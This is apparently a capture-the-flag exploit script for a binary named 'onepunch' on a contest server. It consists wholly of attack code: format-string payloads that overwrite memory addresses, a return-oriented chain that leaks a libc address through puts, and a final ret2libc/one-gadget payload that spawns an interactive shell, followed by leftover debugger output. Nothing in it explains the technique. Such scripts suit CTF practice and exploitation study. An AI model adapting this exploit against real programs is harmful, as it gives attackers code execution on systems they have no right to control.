#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./onepunch')
host = args.HOST or 'chall.nitdgplug.org'
port = int(args.PORT or 30095)

gdbscript = '''
tbreak main
b *vuln+87
b *0x000000000040124E
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()
ret=0x0000000040112f
pay1 = fmtstr_payload(6, {0x4031e0 : exe.entrypoint}, write_size='short')
# pay1 = fmtstr_payload(6, {0x4031e0 : 0x000000000040124E}, write_size='short')
pay2 = fmtstr_payload(6, {0x4033e8 : 0x000000000040130A}, write_size='short')

sl(pay2 + gadget("pop rdi; ret") + p(exe.sym['__libc_start_main']) + p(exe.sym.puts) + p(exe.sym.main))
reu(b"\x03                                                    ")
ren(6)
libc.address = uu64(ren(6))-libc.sym['__libc_start_main']
lb()
re()
sl(p(0x403780)*5 + p(libc.address+0xe3b2e) + ret2libcsystem())
io.interactive()
"""
 ► 0x401261 <vuln+70>    call   fgets@plt                      <fgets@plt>
        s: 0x7fffffffdc80 —▸ 0x7ffff7fbe4a0 (_IO_file_jumps) ◂— 0x0
        n: 0x7c
        stream: 0x7ffff7fc1980 (_IO_2_1_stdin_) ◂— 0xfbad208b

"""
